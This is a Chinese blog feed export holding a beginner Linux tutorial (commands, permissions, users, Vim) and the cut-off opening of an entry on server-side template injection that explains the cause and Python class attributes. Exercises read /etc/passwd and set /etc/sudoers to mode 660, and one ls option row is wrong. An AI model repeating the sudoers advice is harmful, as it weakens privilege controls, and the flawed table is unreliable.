        <content type="html"><![CDATA[<h1 id="Linux命令初体验"><a href="#Linux命令初体验" class="headerlink" title="Linux命令初体验"></a>Linux命令初体验</h1><h2 id="Linux命令终端介绍"><a href="#Linux命令终端介绍" class="headerlink" title="Linux命令终端介绍"></a>Linux命令终端介绍</h2><p>退出命令终端输入exit或者ctrl+d快捷方式退出命令终端</p><h3 id="设置命令终端窗口字体大小"><a href="#设置命令终端窗口字体大小" class="headerlink" title="设置命令终端窗口字体大小"></a>设置命令终端窗口字体大小</h3><p>设置命令终端窗口字体大小： </p><p>临时设置字体大小 </p><pre class="line-numbers language-none"><code class="language-none">ctrl + - :缩小字体 ctrl + shift + + :增大字体 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>持久设置字体大小 </p><pre class="line-numbers language-none"><code class="language-none">在命令终端界面点击右键--&gt;配置文件首选项--&gt;文本--&gt;自定义字体<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="命令提示符"><a href="#命令提示符" class="headerlink" title="命令提示符"></a>命令提示符</h3><p>(root㉿kali)-[&#x2F;opt]</p><pre class="line-numbers language-none"><code class="language-none">root:用户名kali:表示主机名opt ：表示当前目录名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Linux命令体验"><a href="#Linux命令体验" class="headerlink" title="Linux命令体验"></a>Linux命令体验</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">who ：显示当前登录用户pwd（<span class="token keyword">print</span> work directory）：显示当前目录cd <span class="token punctuation">(</span>change directory<span class="token punctuation">)</span><span class="token punctuation">:</span> 切换目录cd <span class="token operator">~</span> <span class="token punctuation">:</span> 切换到用户工作目录tree <span class="token punctuation">:</span>查看文件列表ls ：查看文件列表ls <span class="token operator">-</span>lifconfig（interface config）查看网卡配置信息linux查看ip ： ifconfigwindow查看ip： ipconfigip地址有ipv4和ipv6两个版本， 目前主要使用ipv4ping ：测试主机间的连接情况主机可以用ip地址或者域名来描述 比如<span class="token punctuation">:</span> ping <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span>       ping www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>comclear： 清除命令终端内容ctrl<span class="token operator">+</span>L <span class="token punctuation">:</span>快捷方式清除命令终端内容uname ：显示操作系统信息 uname <span class="token operator">-</span>r    uname <span class="token operator">-</span>auname <span class="token operator">-</span>r ：查看linux内核版本发行号 exit： 退出或注销用户shutdown ：关闭系统shutdown –r now <span class="token punctuation">:</span>重启系统shutdown –h now <span class="token punctuation">:</span>关机shutdown –h <span class="token operator">+</span><span class="token number">5</span> <span class="token punctuation">:</span><span class="token number">5</span>分钟之后关机shutdown –c <span class="token punctuation">:</span>取消预定的关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Linux命令格式"><a href="#Linux命令格式" class="headerlink" title="Linux命令格式"></a>Linux命令格式</h2><pre class="line-numbers language-none"><code class="language-none">command[-options][parameter]command:命令名，比如：who,pwd[-options]:选项，可以有零个、一个或者多个选项，多个选项可以合并，比如使用的 -r 就是选项[parameter]:参数，可以有零个、一个或者多个参数，比如：ping 192.168.1.6， cd ~  这些都是参数[]代表可选<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用Linux命令的小技巧"><a href="#使用Linux命令的小技巧" class="headerlink" title="使用Linux命令的小技巧"></a>使用Linux命令的小技巧</h2><h3 id="命令补全"><a href="#命令补全" class="headerlink" title="命令补全"></a>命令补全</h3><p>当输入的字符足以确定某个命令或者某个文件时，只需按Tab键就可以自动补全该命令或者剩下的命令</p><h3 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h3><p>使用上下箭头查看已经使用过的历史命令</p><p>使用history命令查看已经使用过的命令</p><p>​！+序列号可以执行对应的命令   注意！和序列号之间没有空格</p><h3 id="终止命令的执行"><a href="#终止命令的执行" class="headerlink" title="终止命令的执行"></a>终止命令的执行</h3><p>ctrl+c：终止命令的执行</p><p>测试top命令查看系统执行效果:[lijun@192~]$top</p><h3 id="查看命令帮助方式"><a href="#查看命令帮助方式" class="headerlink" title="查看命令帮助方式"></a>查看命令帮助方式</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">help</span>   eg<span class="token punctuation">:</span>uname <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">help</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">man命令man命令是manual的简写，表示查看指定命令的使用说明书使用格式：man命令名例如：man uname<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>操作键</th><th>说明</th></tr></thead><tbody><tr><td>空格</td><td>显示下一屏的信息</td></tr><tr><td>回车</td><td>显示下一行信息</td></tr><tr><td>q</td><td>退出</td></tr></tbody></table><h1 id="Linux常用命令1"><a href="#Linux常用命令1" class="headerlink" title="Linux常用命令1"></a>Linux常用命令1</h1><h3 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h3><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321223051622.png" alt="image-20230321223051622"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">主要目录说明<span class="token punctuation">:</span><span class="token operator">/</span>：Linux文件系统根目录，所有文件都是在该目录下面<span class="token operator">/</span>boot启动Linux时使用的一些核心文件<span class="token operator">/</span>root该目录为系统管理员（超级用户root）的主目录。<span class="token operator">/</span><span class="token builtin">bin</span>binary的缩写，用来存放用户命令文件。<span class="token operator">/</span>sbins就是Super User的意思。这里存放的是系统管理员使用的系统管理命令文件。<span class="token operator">/</span>etc<span class="token operator">/</span>存放系统管理所需要的配置文件。<span class="token operator">/</span>dev<span class="token operator">/</span>dev是Device<span class="token punctuation">(</span>设备<span class="token punctuation">)</span>的缩写。该目录下存放的是设备文件，在Linux中访问外部设备的方式和访问文件的方式是相同的。<span class="token operator">/</span>home用以存放普通用户的主目录。在Linux中，每个用户都有一个自己的目录，一般以用户的账号命名<span class="token operator">/</span>home<span class="token operator">/</span>用户名某普通用户的主目录，假如用户名是pz，则<span class="token operator">/</span>home<span class="token operator">/</span>pz则为该用户的主目录，可简写为<span class="token operator">~</span><span class="token operator">/</span>opt可选文件和程序的存储目录。该目录主要被第三方开发者用来简易地安装和卸装他们的软件包。<span class="token operator">/</span>mnt该目录中通常包括系统引导后被挂载的文件系统的挂载点。<span class="token operator">/</span>usr<span class="token operator">/</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>包括与系统用户直接有关的文件和目录 <span class="token operator">/</span>usr<span class="token operator">/</span>X11R6：X Window的目录；<span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span>：存放着许多应用程序；<span class="token operator">/</span>usr<span class="token operator">/</span>sbin：存放root超级用户使用的管理程序；<span class="token operator">/</span>usr<span class="token operator">/</span>lib：存放一些常用的动态链接共享库和静态档案库；<span class="token operator">/</span>usr<span class="token operator">/</span>src：存放源代码，Linux源代码就存在这个目录中。<span class="token operator">/</span>usr<span class="token operator">/</span>local：这是提供给一般用户的<span class="token operator">/</span>usr目录，在这里安装一般的应用软件；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="目录切换"><a href="#目录切换" class="headerlink" title="目录切换"></a>目录切换</h3><h4 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h4><p>绝对路径：是指从根目录&#x2F;开始的路径</p><p>相对路径：是指从当前目录开始的路径</p><h4 id="使用cd命令切换目录"><a href="#使用cd命令切换目录" class="headerlink" title="使用cd命令切换目录"></a>使用cd命令切换目录</h4><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>使用cd命令切换目录</td><td>切换到指定目录</td></tr><tr><td>cd ~ (波浪线)</td><td>切换到当前用户的主目录</td></tr><tr><td>cd ..</td><td>切换到上一级目录</td></tr><tr><td>cd .</td><td>切换到当前目录</td></tr><tr><td>cd -</td><td>切换到上一次目录</td></tr></tbody></table><h3 id="查看目录的文件列表信息"><a href="#查看目录的文件列表信息" class="headerlink" title="查看目录的文件列表信息"></a>查看目录的文件列表信息</h3><p>文件信息:</p><p>当创建一个文件的时候，系统保存了有关该文件的全部信息包括：文件的名称、文件的位置、文件类型、文件长度、文件的拥有者、i节点、文件的修改时间、文件的权限等</p><p>命令：ls</p><table><thead><tr><th>命令选项</th><th>说明</th></tr></thead><tbody><tr><td>-l</td><td>以列表方式显示use a long listing format</td></tr><tr><td>-h</td><td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td></tr><tr><td>-a</td><td>以大小单位显示，默认是字节with -l and&#x2F;or -s, print human readable sizes (e.g., 1K 234M 2G)</td></tr></tbody></table><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224221903.png" alt="image-20230321224221903"></p><p>文件类型</p><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224302825.png" alt="image-20230321224302825"></p><p>文件权限</p><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230321224321300.png" alt="image-20230321224321300"></p><p>提示：</p><p>1.选项之间可以组合一起使用</p><p>2.-h选项一般结合-l一起使用</p><p>3.文件与目录名前添加   .  ，用于隐藏文件</p><p>练习</p><pre class="line-numbers language-none"><code class="language-none">(当前目录是rh用户的主目录)1.以相对路径与绝对路径切换(cd)到用户主目录( &#x2F;home&#x2F;rh)cd &#x2F;home&#x2F;rh2.以相对路径与绝对路径切换(cd)到根目录下的opt子目录(&#x2F;opt)cd ..&#x2F;..&#x2F;optcd &#x2F;opt3.使用ls -l命令查看用户主目录的内容ls -l &#x2F;home&#x2F;rhls -l ~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建、删除文件及目录命令"><a href="#创建、删除文件及目录命令" class="headerlink" title="创建、删除文件及目录命令"></a>创建、删除文件及目录命令</h3><pre class="line-numbers language-none"><code class="language-none">touch  文件路径&#x2F;文件名:创建指定文件mkdir   目录名:创建目录(文件夹)选项：p级联创建目录rm     文件\文件夹:删除指定文件  选项：r：递归删除目录及其内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">当前目录是kali用户主目录<span class="token number">1.</span>在当前目录创建info<span class="token punctuation">.</span>txt文件touch info<span class="token punctuation">.</span>txt<span class="token number">2.</span>在当前目录创建CTF文件夹mkdir CTF<span class="token number">3.</span>在CTF文件夹下创建a<span class="token punctuation">.</span>txt文件touch <span class="token punctuation">.</span><span class="token operator">/</span>CTF<span class="token operator">/</span>a<span class="token punctuation">.</span>txt<span class="token number">4.</span>删除用户主目录info<span class="token punctuation">.</span>txt文件rm <span class="token operator">~</span><span class="token operator">/</span>info<span class="token punctuation">.</span>txt<span class="token number">5.</span>删除CTF文件夹rm <span class="token operator">-</span>r <span class="token operator">~</span><span class="token operator">/</span>CTF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复制、移动文件及目录命令"><a href="#复制、移动文件及目录命令" class="headerlink" title="复制、移动文件及目录命令"></a>复制、移动文件及目录命令</h3><p>cp : 拷贝文件、拷贝目录</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#拷贝文件</span>cp  源文件 目标路径<span class="token operator">/</span>目标文件名<span class="token number">1.</span>如果不指定目标文件名，使用源文件名<span class="token number">2.</span>如果目标文件存在，覆盖原来文件<span class="token comment">#</span>拷贝目录cp <span class="token operator">-</span>r 源目录 目标目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mv:移动文件、移动目录、重命名，move</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#移动文件</span>mv 源文件 目标路径<span class="token operator">/</span>目标文件名<span class="token number">1.</span>如果不指定目标文件名，使用源文件名<span class="token number">2.</span>如果目标文件存在，覆盖原来文件<span class="token comment">#移动目录</span>mv 源目录 目标目录<span class="token comment">#重命名：</span>mv 源文件名 目标文件名<span class="token punctuation">(</span>在同一级目录下<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">当前目录为用户主目录1.在当前目录创建info.txt文件touch info.txt2.在当前目录创建CTF文件夹mkdir CTF3.在CTF文件夹下创建a.txt文件touch .&#x2F;CTF&#x2F;a.txt4.拷贝info.txt到CTF目录下cp info.txt .&#x2F;CTF5.对a.txt文件移动到用户主目录下，且重命名为b.txtmv CTF&#x2F;a.txt &#x2F;home&#x2F;kali&#x2F;b.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重定向与管道命令"><a href="#重定向与管道命令" class="headerlink" title="重定向与管道命令"></a>重定向与管道命令</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">重定向把原本输出到屏幕上的内容，输出到文件中<span class="token punctuation">(</span>文件不存在，则新建<span class="token punctuation">)</span>，这就是重定向重定向命令：<span class="token operator">></span><span class="token punctuation">:</span>覆盖模式重定向、<span class="token operator">>></span><span class="token punctuation">:</span>追加模式重定向管道命令<span class="token operator">|</span>：管道的功能是将前一个程序的输出作为后一个程序的输入wc：word count：单词统计<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">cat<span class="token punctuation">:</span>查看文件内容more：分屏查看文件内容，按空格切换到下一屏<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>练习</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span>把历史命令history输出的内容写入到用户主目录的myfile<span class="token punctuation">.</span>txt文件中history <span class="token operator">></span> myfile<span class="token punctuation">.</span>txt<span class="token number">2.</span>把<span class="token operator">/</span>根目录下的文件列表追加到用户主目录的myfile<span class="token punctuation">.</span>txt文件中ls <span class="token operator">/</span> <span class="token operator">>></span> myfile<span class="token punctuation">.</span>txt<span class="token number">3.</span>用ls显示<span class="token operator">/</span>目录的目录和文件，并且分屏显示ls <span class="token operator">/</span> <span class="token operator">|</span> morels <span class="token operator">/</span> <span class="token operator">|</span> wc<span class="token number">4.</span>分别用cat和more命令查看 <span class="token operator">/</span>etc<span class="token operator">/</span>passwd的内容cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwdmore <span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Linux常用命令2"><a href="#Linux常用命令2" class="headerlink" title="Linux常用命令2"></a>Linux常用命令2</h1><h3 id="文件打包压缩命令tar"><a href="#文件打包压缩命令tar" class="headerlink" title="文件打包压缩命令tar"></a>文件打包压缩命令tar</h3><p>tar命令可用于压缩解压文件，好比windows的winRAR</p><p>语法格式：</p><p>tar[选项]文件或者目录</p><p>tar选项</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-c</td><td>创建新的打包文件</td></tr><tr><td>-v</td><td>显示打包或者解包的文件的详情</td></tr><tr><td>-f</td><td>使用打包文件或者设备,这个选项是必选项，一般放到所有选项后面</td></tr><tr><td>-z</td><td>用gzip格式来压缩或解压缩文件(.gz)</td></tr><tr><td>-j</td><td>用bzip2格式来压缩或解压缩文件(.bz2)</td></tr><tr><td>-x</td><td>解包</td></tr><tr><td>-C</td><td>解压到指定目录</td></tr></tbody></table><p>gz格式压缩和解压:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tar <span class="token operator">-</span>zcvf 压缩后的名字 <span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz 要压缩的文件和目录tar <span class="token operator">-</span>zxvf 压缩包的名字 <span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz <span class="token operator">-</span>C 要解压到的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>.bz2的压缩和解压缩格式:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tar <span class="token operator">-</span>jcvf 压缩后的名字 <span class="token punctuation">.</span>tar<span class="token punctuation">.</span>bz2 要压缩的文件tar <span class="token operator">-</span>jxvf 压缩包的名字<span class="token punctuation">.</span>tar<span class="token punctuation">.</span>bz2 <span class="token operator">-</span>C 要解压到的目录<span class="token punctuation">(</span>目录需要存在<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="用户分类"><a href="#用户分类" class="headerlink" title="用户分类"></a>用户分类</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">超级用户<span class="token punctuation">(</span>管理员<span class="token punctuation">)</span>该用户具有所有管理权限，UID<span class="token operator">=</span><span class="token number">0</span>系统用户针对特定的系统服务而开设的用户，系统用户不能用于登录，UID范围<span class="token number">1</span><span class="token operator">-</span><span class="token number">999</span>普通用户为了让使用者使用Linux系统资源而建立的户，UID范围<span class="token number">1000</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">65535</span>查看用户<span class="token builtin">id</span>命令<span class="token punctuation">:</span><span class="token builtin">id</span><span class="token punctuation">[</span>用户名<span class="token punctuation">]</span>选项： <span class="token operator">-</span>u<span class="token punctuation">(</span>查看用户uid<span class="token punctuation">)</span> <span class="token operator">-</span>g<span class="token punctuation">(</span>查看用户gid<span class="token punctuation">)</span> <span class="token operator">-</span>G<span class="token punctuation">(</span>查看用户所在所有组的<span class="token builtin">id</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="用户、组相关的配置文件"><a href="#用户、组相关的配置文件" class="headerlink" title="用户、组相关的配置文件"></a>用户、组相关的配置文件</h4><p>配置文件</p><table><thead><tr><th>文件名</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;etc&#x2F;passwd&#x2F;</td><td>用户信息库</td></tr><tr><td>&#x2F;etc&#x2F;group</td><td>用户组信息库</td></tr><tr><td>&#x2F;etc&#x2F;shadow</td><td>用户认证信息</td></tr><tr><td>&#x2F;etc&#x2F;gshadow</td><td>用户组认证信息</td></tr></tbody></table><h4 id="用户管理-1"><a href="#用户管理-1" class="headerlink" title="用户管理"></a>用户管理</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">添加用户useradd <span class="token punctuation">[</span>选项 参数<span class="token punctuation">]</span> 用户名选项：<span class="token operator">-</span>d ： 指定用户主目录默认的主目录<span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token operator">-</span>M ：不创建用户主目录useradd CTF<span class="token operator">-</span>s ： 指定新用户登录后使用的shell，默认是<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">设置用户密码passwd 用户名修改用户属性usermod <span class="token punctuation">[</span>选项 参数<span class="token punctuation">]</span> 用户名删除用户userdel 用户名选项<span class="token operator">-</span>r<span class="token punctuation">:</span>同时删除用户主目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sudo命令-super-user-do"><a href="#sudo命令-super-user-do" class="headerlink" title="sudo命令 super user do"></a>sudo命令 super user do</h3><pre class="line-numbers language-none"><code class="language-none">sudo 以超级用户身份执行某条文件命令格式：sudo 当前用户要执行某条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>用于修改文件权限</p><h4 id="文件列表中权限查看"><a href="#文件列表中权限查看" class="headerlink" title="文件列表中权限查看"></a>文件列表中权限查看</h4><pre class="line-numbers language-none"><code class="language-none">-rw-rw-r-- 1 rh rh 6 7月 1908:43 b.txt文件的权限分为3组，每一组由三个字母组成（rwx-）1.rw-文件属主用户对文件的权限2.rw-文件属主用户的同组用户具有的权限3.r--其他用户具有的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322204030351.png" alt="image-20230322204030351"></p><h4 id="字母法"><a href="#字母法" class="headerlink" title="字母法"></a>字母法</h4><p>命令格式：chmod MODE[,MODE]…FILE…</p><pre class="line-numbers language-none"><code class="language-none">chmod u+r a.txt针对a.txt文件，属主用户增加读权限chmod u&#x3D;rW,g&#x3D;r,o&#x3D;- b.txt针对b.txt文件，属主用户设置读和写权限，同组的用户设置读和写的权限,其他用户增加读权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>角色说明</p><table><thead><tr><th>角色</th><th>说明</th></tr></thead><tbody><tr><td>u</td><td>user,表示该文件的所有者</td></tr><tr><td>g</td><td>group,表示用户组</td></tr><tr><td>o</td><td>other,表示其他用户</td></tr><tr><td>a</td><td>all,表示所有用户</td></tr></tbody></table><p>权限设置说明</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>增加权限</td></tr><tr><td>-</td><td>撤销权限</td></tr><tr><td>&#x3D;</td><td>设置权限</td></tr></tbody></table><p>权限说明</p><table><thead><tr><th>权限</th><th>说明</th></tr></thead><tbody><tr><td>r</td><td>可读</td></tr><tr><td>w</td><td>可写</td></tr><tr><td>x</td><td>可执行，假如是目录，表示可打开目录</td></tr><tr><td>-</td><td>无任何权限</td></tr></tbody></table><h4 id="数字化"><a href="#数字化" class="headerlink" title="数字化"></a>数字化</h4><p>就是rwx用数字代替</p><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322211901985.png" alt="image-20230322211901985"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">使用数字法对<span class="token operator">/</span>etc<span class="token operator">/</span>sudoers文件的属主用户设置读写权限，同组用户为读写权限，其他用户为无权限rw<span class="token operator">-</span>rw<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>chmod <span class="token number">660</span> <span class="token operator">/</span>etc<span class="token operator">/</span>sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Vim编辑器"><a href="#Vim编辑器" class="headerlink" title="Vim编辑器"></a>Vim编辑器</h1><h4 id="认识Vim"><a href="#认识Vim" class="headerlink" title="认识Vim"></a>认识Vim</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">VI是Unix家族中极为普遍的文本编辑器，Vim则是它的改进版本Vi IMproved的简称，它的最大特色就是使用命令进行编辑，且完全脱离了鼠标的操作<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Vim的三种工作模式"><a href="#Vim的三种工作模式" class="headerlink" title="Vim的三种工作模式"></a>Vim的三种工作模式</h4><p>命令模式</p><pre class="line-numbers language-none"><code class="language-none">启动Vim，默认进入命令模式。在该模式下，此时从键盘上输入的任何字符都被当做编辑命令来解释常用于对文档进行复制、粘贴、删除、移动光标等操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编辑模式</p><pre class="line-numbers language-none"><code class="language-none">在命令模式下输入插入命令i、附加命令a、打开命令o都可以进入编辑模式，一次Insert键:插入字符、两次Insert键:替换字符(REPLACE)在该模式下，主要用于录入文本。按ESC键回退到命令模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>末行模式</p><pre class="line-numbers language-none"><code class="language-none">在命令模式按shift+；即按:进入末行模式，多数文件管理命令(保存、退出、定位、查找、替换、设置行标等)都是在此模式下执行的回车执行完命令或按ESC键回退到命令模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/image-20230322212409215.png" alt="image-20230322212409215"></p><h4 id="使用Vim编辑文件，文档配置"><a href="#使用Vim编辑文件，文档配置" class="headerlink" title="使用Vim编辑文件，文档配置"></a>使用Vim编辑文件，文档配置</h4><p>示例:使用Vim修改主机名</p><p>主机名配置文件：&#x2F;etc&#x2F;hostname</p><p>切换到root账号:suroot</p><p>使用Vim打开配置文件：vim&#x2F;etc&#x2F;hostname</p><p>按i进入编辑模式</p><p>修改为新的主机名(不要输入中文)</p><p>按ESC键由编辑模式进入命令模式</p><p>按shift+;由命令模式进入末行模式</p><p>输入wq保存退出Vim</p><p>注销用户或者重启系统后查看效果</p><h4 id="Vim常用的命令"><a href="#Vim常用的命令" class="headerlink" title="Vim常用的命令"></a>Vim常用的命令</h4><h5 id="命令模式下的Vim操作"><a href="#命令模式下的Vim操作" class="headerlink" title="命令模式下的Vim操作"></a>命令模式下的Vim操作</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">准备操作素材vim temp<span class="token punctuation">.</span>txt从命令模式按i或者a进入编辑模式录入如下图所示文本在编辑模式按esc回退到命令模式，再按shift<span class="token operator">+</span><span class="token punctuation">;</span>进入末行模式在末行模式中输入wq保存退出素材准备完毕<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span>移动光标操作方向箭头<span class="token punctuation">(</span>上下左右<span class="token punctuation">)</span><span class="token operator">^</span>移至行首<span class="token punctuation">,</span>$移至行尾G和gg<span class="token punctuation">(</span>G移到文档最后一行，gg移到文档首行<span class="token punctuation">)</span><span class="token number">2.</span>删除命令操作x删除光标所在字符dd剪切删除光标所在的一行<span class="token number">3.</span>复制与粘贴命令yy与nyy：yy复制当前光标所在行，n yy复制光标行及光标下n<span class="token operator">-</span><span class="token number">1</span>行p与np：p粘贴一次<span class="token punctuation">,</span>n p粘贴n次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="末行模式下的vim操作"><a href="#末行模式下的vim操作" class="headerlink" title="末行模式下的vim操作"></a>末行模式下的vim操作</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1.</span>文件保存退出w保存文档q退出文档wq保存且退出文档q!不保存退出文档<span class="token number">2.</span>显示或隐藏行号setnu显示行号setnonu隐藏行号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/2023/03/16/SSTI/"/>
      <url>/2023/03/16/SSTI/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTI漏洞产生原因"><a href="#SSTI漏洞产生原因" class="headerlink" title="SSTI漏洞产生原因"></a>SSTI漏洞产生原因</h2><p>render_template函数自动渲染对应的内容，不会在执行渲染，但是你用render_template_string就可能出现再次渲染的问题</p><p>导致里面的x会当作代码执行</p><h2 id="python类基础"><a href="#python类基础" class="headerlink" title="python类基础"></a>python类基础</h2><h3 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h3><p>在python中object类是python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类，每个类都有魔术变量__class__,表示当前类</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h3><p>每一个类都有一个__bases__属性，列出其基类</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">变量<span class="token punctuation">.</span>__class__<span class="token 